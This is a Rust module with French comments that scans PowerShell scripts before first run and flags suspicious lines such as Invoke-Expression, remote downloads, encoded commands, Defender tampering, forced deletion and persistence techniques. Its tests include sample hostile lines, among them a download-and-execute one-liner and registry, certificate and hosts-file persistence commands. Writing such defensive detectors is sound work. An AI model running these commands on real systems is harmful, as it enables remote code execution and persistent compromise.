//! Points d'attention detectes avant premiere execution (specification 12.2).
//!
//! Explicitement **non exhaustif** et **jamais un verdict** : trivialement
//! contournable (obfuscation, concatenation de chaines, `iex` deguise). Sert
//! a attirer l'oeil sur un script inconnu avant de l'approuver, pas a
//! remplacer un antivirus. Distinct du champ `risk` declare par l'auteur
//! (§5.1), qui n'a lui non plus aucune valeur face a un script malveillant.

use serde::Serialize;

#[derive(Debug, Clone, Serialize, PartialEq)]
pub struct PointAttention {
    pub code: String,
    pub ligne: usize,
    pub extrait: String,
}

/// Recherche par sous-chaine, pas par regex : les motifs sont des noms de
/// cmdlets/parametres litteraux, une correspondance exacte suffit et evite
/// une dependance de plus pour un detecteur deja annonce best-effort.
fn ligne_contient_toutes(ligne_minuscule: &str, mots: &[&str]) -> bool {
    mots.iter().all(|m| ligne_minuscule.contains(m))
}

pub fn detecter(source: &str) -> Vec<PointAttention> {
    let mut trouves = Vec::new();

    for (index, ligne) in source.lines().enumerate() {
        let minuscule = ligne.to_lowercase();
        let numero = index + 1;
        let extrait = || ligne.trim().to_string();

        if ligne_contient_toutes(&minuscule, &["invoke-expression"])
            || minuscule.contains(" iex ")
            || minuscule.trim_start().starts_with("iex ")
        {
            trouves.push(PointAttention {
                code: "INVOKE_EXPRESSION".into(),
                ligne: numero,
                extrait: extrait(),
            });
        }
        if minuscule.contains("downloadstring") || minuscule.contains("downloadfile") {
            trouves.push(PointAttention {
                code: "TELECHARGEMENT_DYNAMIQUE".into(),
                ligne: numero,
                extrait: extrait(),
            });
        }
        if minuscule.contains("-encodedcommand") {
            trouves.push(PointAttention {
                code: "COMMANDE_ENCODEE".into(),
                ligne: numero,
                extrait: extrait(),
            });
        }
        if minuscule.contains("set-mppreference") || minuscule.contains("add-mppreference") {
            trouves.push(PointAttention {
                code: "DEFENDER_DESACTIVE".into(),
                ligne: numero,
                extrait: extrait(),
            });
        }
        if ligne_contient_toutes(&minuscule, &["remove-item", "-recurse", "-force"]) {
            trouves.push(PointAttention {
                code: "SUPPRESSION_FORCEE".into(),
                ligne: numero,
                extrait: extrait(),
            });
        }
        for (code, variantes) in PERSISTANCE {
            if variantes
                .iter()
                .any(|mots| ligne_contient_toutes(&minuscule, mots))
            {
                trouves.push(PointAttention {
                    code: code.into(),
                    ligne: numero,
                    extrait: extrait(),
                });
            }
        }
    }

    trouves
}

/// Les gestes qu'un logiciel malveillant fait pour s'installer durablement :
/// ceux-la memes que le temoin (§12.5) releve apres coup, reperes ici avant.
/// Chaque variante est une liste de mots qui doivent tous figurer sur la ligne.
const PERSISTANCE: [(&str, &[&[&str]]); 7] = [
    (
        "TACHE_PLANIFIEE",
        &[
            &["register-scheduledtask"],
            &["new-scheduledtask"],
            &["schtasks", "/create"],
        ],
    ),
    (
        "SERVICE_CREE",
        &[
            &["new-service"],
            &["sc.exe", "create"],
            &["sc ", " create "],
        ],
    ),
    (
        "DEMARRAGE_AUTO",
        &[
            &["currentversion\\run"],
            &["\\winlogon"],
            &["start menu\\programs\\startup"],
        ],
    ),
    (
        "CERTIFICAT_RACINE",
        &[
            &["import-certificate", "root"],
            &["cert:\\localmachine\\root"],
            &["certutil", "-addstore"],
        ],
    ),
    (
        "PARE_FEU",
        &[
            &["new-netfirewallrule"],
            &["set-netfirewallprofile"],
            &["netsh", "advfirewall", "add"],
        ],
    ),
    ("FICHIER_HOSTS", &[&["drivers\\etc\\hosts"]]),
    (
        "VARIABLE_SYSTEME",
        &[
            &["setenvironmentvariable", "machine"],
            &["setx", "/m"],
            &["session manager\\environment"],
        ],
    ),
];

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn detecte_invoke_expression() {
        let source = "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://x')";
        let points = detecter(source);
        assert!(points.iter().any(|p| p.code == "INVOKE_EXPRESSION"));
        assert!(points.iter().any(|p| p.code == "TELECHARGEMENT_DYNAMIQUE"));
    }

    #[test]
    fn detecte_la_suppression_forcee_recursive() {
        let source = "Remove-Item C:\\Temp -Recurse -Force";
        let points = detecter(source);
        assert_eq!(points.len(), 1);
        assert_eq!(points[0].code, "SUPPRESSION_FORCEE");
    }

    #[test]
    fn un_script_ordinaire_ne_declenche_rien() {
        let source = "Write-Host 'Bonjour'\nStop-Service -Name Spooler -Force";
        assert!(detecter(source).is_empty());
    }

    #[test]
    fn repere_les_gestes_de_persistance() {
        let source = "Register-ScheduledTask -TaskName X -Action $a\n\
                      Set-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' -Name X -Value y\n\
                      Import-Certificate -FilePath c.cer -CertStoreLocation Cert:\\LocalMachine\\Root\n\
                      New-NetFirewallRule -DisplayName X\n\
                      Add-Content \"$env:SystemRoot\\System32\\drivers\\etc\\hosts\" '0.0.0.0 x'\n\
                      [Environment]::SetEnvironmentVariable('X', 'y', 'Machine')\n\
                      New-Service -Name X -BinaryPathName c.exe";
        let codes: Vec<String> = detecter(source).into_iter().map(|p| p.code).collect();
        for attendu in [
            "TACHE_PLANIFIEE",
            "DEMARRAGE_AUTO",
            "CERTIFICAT_RACINE",
            "PARE_FEU",
            "FICHIER_HOSTS",
            "VARIABLE_SYSTEME",
            "SERVICE_CREE",
        ] {
            assert!(
                codes.iter().any(|c| c == attendu),
                "{attendu} manque : {codes:?}"
            );
        }
    }

    #[test]
    fn signale_la_ligne_exacte() {
        let source = "Write-Host 'debut'\nInvoke-Expression $x\nWrite-Host 'fin'";
        let points = detecter(source);
        assert_eq!(points[0].ligne, 2);
    }
}
